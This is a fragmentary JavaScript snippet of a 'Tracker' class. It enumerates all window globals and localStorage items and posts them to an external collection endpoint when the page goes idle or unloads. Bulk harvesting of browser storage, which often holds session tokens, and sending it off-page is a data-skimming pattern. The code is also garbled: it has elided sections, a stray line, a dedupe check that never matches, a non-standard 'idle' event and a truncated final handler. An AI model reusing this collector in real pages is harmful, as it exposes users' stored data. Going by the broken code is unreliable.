class Tracker {
  constructor() {
    ...
    this.serverEndpoint = "https://example.com/api/collect";
    this.globalVars = [];
    this.localStorageItems = [];
  }
  addObserver(type, observerFunc) {
    window.addEventListener(type, observerFunc);
  }
  discoverGlobalAndLocalStorageVariables() {
    for (const item in window) {
      if (Object.prototype.hasOwnProperty.call(window, item)) {
        if (!this.globalVars.some(globalVar => globalVar === item)) {
          this.globalVars.push({
            item: typeof window[item]
          });
        }
      }
    }
  ...
  sendData(data) {
    ...
    request.onload = () => {
      if (request.status >= 200 && request.status < 400) {
        ...
        console.error(`Failed to send data, status: ${request.status}`);
      }
    };
    request.onerror = () => console.error("An error occurred while sending data");
...
tracker.discoverGlobalAndLocalStorageVariables();
;
tracker.createHooks();
tracker.addObserver("idle", () => {
  const data = {
    globalVars: tracker.globalVars,
    localStorageItems: tracker.localStorageItems
  };
  tracker.sendData(data);
});
tracker.addObserver("beforeunload", () => {
  const data = {
    globalVars: tracker.globalVars,
    localStorageItems: tracker.localStorageItems
  };
